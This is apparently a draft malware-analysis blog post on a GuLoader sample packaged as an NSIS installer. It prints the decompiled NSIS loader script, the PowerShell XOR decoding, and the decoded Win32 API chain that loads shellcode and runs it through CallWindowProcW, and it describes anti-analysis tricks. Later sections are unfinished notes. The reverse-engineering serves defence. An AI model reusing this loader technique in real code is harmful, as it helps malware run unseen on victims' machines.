---
layout: single
classes: wide
title:  "In-Depth Analysis of the GuLoader Malware"
date:   2023-xx-xx 20:30:00 +0200
category: Malware
tags: [guloader, shellcode, malware, powershell,  ]
---

In late August 2022 I received an interesting piece of malware. It got delivered as a zip archive which contained a 32-bit Windows PE-file, which turned out to be an NSIS Installer.
This article talks about how the NSIS based loader works, and how to analyze the file until we're left with the final stage.

Based on other blog posts, I assume that this malware is part of the GuLoader malware family.

## NSIS Installer

NSIS is the abbreviation for the [_Nullsoft Scriptable Install System_](https://en.wikipedia.org/wiki/Nullsoft_Scriptable_Install_System), which, as the name suggests, is a scriptable installer tool for installing software on a device.
There doesn't seem to be a whole lot of software that's able to extract the installer information from the final executable.
Luckily, 7zip versions up to 15.05 (or later if compiled with specific compile flags) are able to extract all the necessary files for us to analyze.

```text
.
└── Versanddokumente.exe
    ├── $PLUGINSDIR
    │   ├── nsExec.dll
    │   └── System.dll
    ├── Diabasen.Une
    ├── Handsfree.dll
    ├── Hosannaed.dix
    ├── imagequant.dll
    ├── System.Diagnostics.StackTrace.dll
    └── [NSIS].nsi
```

As we can see, the executable contains the NSIS script file (`[NSIS].nsi` - containing the installation script or instructions that get executed), some dlls in the $PLUGINSDIR, three DLLs in the root directory (which seem to be just decoy), and two files `Diabasen.Une` and `Hosannaed.dix`.
These files will be important later on, so let's check them out.

**Hosannaed.dix** contains only uppercase ASCII characters. To be more precise, only uppercase ASCII Hex-chars ([0-9A-F]+). We'll later find out that parts this file decode to Windows API calls.

**Diabasen.Une** starts off with 3240 bytes of "]", then seemingly random bytes. This file contains shellcode that's loaded and executed by the malware at some point.

Both files do not only contain the relevant data, but are actually also filled with junk data, probably to make analysis harder and to trick AV systems.

## Stage 1 - Decoding and Preparation

Upon inspection of the NSIS script (`[NSIS].nsi`), it becomes obvious that it decodes the file `Hosannaed.dix` by continuously reading two bytes (ASCII chars) from `Hosannaed.dix` starting at offset 8246 (decimal) and passing them to the NSIS script function **"func_13"**. This function calls the function "nsExec::ExecToStack" from the `nsExec.dll` in the plugin directory which itself is used to call powershell.exe on the system.

// TODO: explain func_47 more

```nsis
Function func_47
  Pop $_58_ ; $INSTDIR\Hosannaed.dix
  FileOpen $_59_ $_58_ r ; $_59_ = content/handle of $INSTDIR\Hosannaed.dix
  FileSeek $_59_ 8246 ; seek at offset 8246 in file
  FileRead $_59_ $_60_ ; read file contents to var $_60_ (from specified offset)
label_51:
  StrCpy $_59_ $_60_ 2 $_56_ ; copy 2 chars from var $_60_ (Hosannaed.dix) with offset var $_56_ (counter) to var $_59_
  Call func_13 ; decrypt 2 ascii chars to one byte with powershell
  IntFmt $_55_ %c $_59_ ; Format xored output as ascii char
  IntOp $_56_ $_56_ + 2 ; Inc counter var $_56_ by 2 because we read two chars
  StrCmp $_55_ _ label_58 ; Check if last char was "_", if yes, jump to label_58, else continue with next line
  StrCpy $_57_ $_57_$_55_ ; append char to result string ($_57_)
  Goto label_51 ; Go to top of loop & start next loop cycle
label_58:
  IntOp $_56_ $_56_ + 4 ; Inc counter by 4 because we skip 0x0d 0x0a (newline)
  HideWindow ; Hide the installer window
  System::Call $_57_ ; Use System.dll from plugins to Call the result string we read from the file (Win32 API)
  StrCpy $_57_ "" ; Empty result string for next loop cycle
  Goto label_51 ; Go to top of loop & start next loop cycle
FunctionEnd
```

### Decrypting with Powershell

The newly spawned powershell process is passed two arguments: Two ascii characters from `Hosannaed.dix`, which are being interpreted as one hex character and a single byte key, `51` (decimal), to decode the passed hex byte.

```nsis
Function func_13
  StrCpy $0 0x$_59_
  StrCpy $9 51
  nsExec::ExecToStack "powershell.exe $0 -bxor $9"
  Pop $_59_
  Pop $_59_
FunctionEnd
```

For each two ascii characters the script will call `func_13` and hence start one individual powershell process with a distinct process command line.
This whole decrypting procedure takes a while, because it's pretty expensive to start that many processes, one for each byte the malware needs to decrypt.
When logging the process command lines, the output looks something like this.

```powershell
powershell.exe 0x78 -bxor 51 # = K
powershell.exe 0x76 -bxor 51 # = E
powershell.exe 0x61 -bxor 51 # = R
# ...
```

The script does that until all of the relevant data of the `Hosannaed.dix` file is decrypted. The data decrypts to the ascii representation of Win32 API calls to several methods.

```text
KERNEL32::CreateFileA(m r4 , i 0x80000000, i 0, p 0, i 4, i 0x80, i 0)i.r5_
KERNEL32::VirtualAlloc(i 0,i 0x100000, i 0x3000, i 0x40)p.r1_
KERNEL32::SetFilePointer(i r5, i 3240 , i 0,i 0)i.r8_
KERNEL32::ReadFile(i r5, i r1, i 0x100000,*i 0, i 0)i.r3_
user32::CallWindowProcW(i r1 ,i 0,i 0, i 0, i 0)_
```

The NSIS script then uses `System::Call $_57_` to execute these Win32 API functions in the context of the NSIS installer. 
That means that the NSIS installer fills the `r1` - `r9` [registers](https://nsis.sourceforge.io/Docs/Chapter4.html#varother) before executing the API calls and stores the results back into the specified registers.

### Loading Shellcode

As we learned earlier, each of these API calls gets executed right after it got decrypted (indicated by a "_" followed by a new line (`0x0d0a`)).
At first the [`KERNEL32::CreateFileA`](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) API call reads the file passed in **r4**. The return value is stored in the **r5** register. At that time **r4** already contains the path to `Diabasen.Une`.

```nsis
label_145:
  HideWindow
  StrCpy $4 $INSTDIR\Diabasen.Une ; store path to Diabasen.Une in r4
  Push $INSTDIR\Hosannaed.dix
  Call func_47
```

Then the installer allocates **0x100000** (1.048.576) bytes of memory with [`KERNEL32::VirtualAlloc`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc). The result (=address of the allocated buffer) is stored in **r1**.

With [`KERNEL32::SetFilePointer`](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfilepointer) the malware jumps to a specific offset (3240 decimal) within the file `Diabasen.Une`, which it read in the first step (**r5**).
The malware then reads the file `Diabasen.Une` (at said offset) to the earlier allocated memory by calling [`KERNEL32::ReadFile`](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile) and passing the file pointer and the pointer to the allocated memory in the api call.
Afterwards we're left with a successfully loaded shellcode in some memory region that's waiting to be executed.

### Executing the shellcode - CallWindowProcW

Up next we find the api call [`user32::CallWindowProcW`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callwindowprocw) which gets passed a pointer to the previously allocated memory region.

At first I wondered why the malware calls this function, but the explanation is quite simple.
From my understanding, the intended use of `CallWindowProcW` is for GUI elements (especially window subclassing) to communicate with each other.
When you subclass a window, you need to call the "original" window procedure and pass any messages to it.
I guess it's like calling [`super` methods in java](https://docs.oracle.com/javase/tutorial/java/IandI/super.html) or the [python `super()`](https://docs.python.org/3/library/functions.html#super) calls.
The first parameter expected by `CallWindowProcW` is a pointer to callback function, more precisely to the previous window procedure (WNDPROC).

This callback function will be called within `CallWindowProcW`.
Malware developers make use of that by simply passing a pointer to some shellcode to said API function.
There seem to be more of these functions.
While researching this malware I came across a [blog post from Osanda Malith](https://osandamalith.com/2021/04/01/executing-shellcode-via-callbacks/).
He explains how different API methods that expect pointers to callback functions and hence can be abused to execute shellcode.

So, since this API method can be used to execute shellcode, now is a good time to check the data at the allocated memory.

## Stage 2 - Dynamic Analysis

Let's recap for a second.
We know that at some point the Malware calls `VirtualAlloc` and later executes the loaded shellcode. That's done by calling the allocated memory address by using `CallWindowProcW`.
So an easy way of analyzing this, is by creating a breakpoint on the `VirtualAlloc` method in x32dbg.

When stepping over the `VirtualAlloc` call, we receive the address of the allocated memory in EAX.
Now we can open the memory view at that exact address to see what gets loaded there later.
The memory will be empty at first, but we can set another breakpoint on `CallWindowProcW`.
The shellcode needs to be loaded right before that call, so when we hit that breakpoint, we can surely assume that the shellcode is ready for execution.

![Loaded allocated memory](/assets/img/guloader-malware/filled_memory.png)

Viewed in the disassembler

![Disassembly of the shellcode](/assets/img/guloader-malware/stage2-shellcode.png)

**Note:** The addresses you'll see in this blog post might differ from one screenshot to the other, because I created the screenshots during different debugging sessions.
{: .notice--info}

### Anti-Analysis

The shellcode implements some pretty annoying techniques in order to make its analysis more time consuming.
For example it contains lots of junk bytes before actual instructions in order to make analysis tools display wrong opcodes.
In the following screenshot you can see that x32dbg decodes the instructions at memory location `029F01AC` as `mov byte ptr ...`.
We land on that instruction via a `jmp` at address `029F017C`.
But that jump should lead to the address `029F01AF` - which would be in the middle of the `mov` instruction.

![Anti-Analysis techniques](/assets/img/guloader-malware/anti-analysis1.png)

When we align the shellcode bytes properly, we find that the jump actually lands on a `nop` instruction instead.
This also has implications on the following instructions, as can be seen in the following screenshot.

![Anti-Analysis techniques](/assets/img/guloader-malware/anti-analysis2.png)

Also just the mere presence of all the junk bytes between the `jmp` instruction and the jump's destination makes the code a lot more illegible and makes you think there's more going on than actually is.
Many of the "real" instructions are also just redundant bloat and have no effect on the execution of the shellcode.
Such junk bytes are found all over the shellcode.

### Decrypting second stage

Now that we have the shellcode in memory, we can easily dump it and e.g. analyze it in IDA.
Or since we're already in the debugger, we step through the instructions.
Using the graph view of x32dbg really helps understand the flow within the shellcode.

Right at the beginning, we find that the variables edi and esi are filled with an initial value and subsequently modified by `sub`, `xor` and `add` instructions so that eventually we're left with the value 0 for edi and 0xBEF48D0E for esi.

---

(edi: mov, sub, xor, xor, add = 0 | esi: mov, xor, sub, xor, xor, xor = 0xBEF48D0E)

Call instruction at +0x22B7 (5 Bytes long), next instruction at +0x22BC.

Call:
take eax from stack: +0x22BC
hardcoded length of 0x17184 (encrypted shellcode inside shellcode)
End address of shellcode = +0x19440

> until call instruction

> Leads to decryption loop

> Gets passed the address of the encrypted stage2 memory

> xor at offset eax+edi with key esi

![Decryption Routine](/assets/img/guloader-malware/decryption_stage_2.png)

## Decrypting third stage


### Anti-Debug

_RtlAddVectoredExceptionHandler -> Intercepting int3 (https://blog.lexfo.fr/dridex-malware.html)
Anti Debug techniques (jump at weird offset)

https://twitter.com/0xToxin/status/1559619321952976899

### IoCs
Versanddokumente.zip - 58623051cb9778dd66ca6fec89886139ee79483a96f88545490a86dc6483bf22
Versanddokumente.exe - 284b3016e2aa1c5d452e0a429278ce9784f912247b10183d2a05aa38d67ecc44


### Other resources
https://bazaar.abuse.ch/sample/284b3016e2aa1c5d452e0a429278ce9784f912247b10183d2a05aa38d67ecc44

https://www.capesandbox.com/analysis/298827/

https://osandamalith.com/2021/04/01/executing-shellcode-via-callbacks/

https://forensicitguy.github.io/guloader-executing-shellcode-callbacks/

https://www.trellix.com/en-us/about/newsroom/stories/research/guloader-the-nsis-vantage-point.html

https://www.fortinet.com/blog/threat-research/spoofed-saudi-purchase-order-drops-guloader-part-two

https://www.crowdstrike.com/blog/guloader-malware-analysis/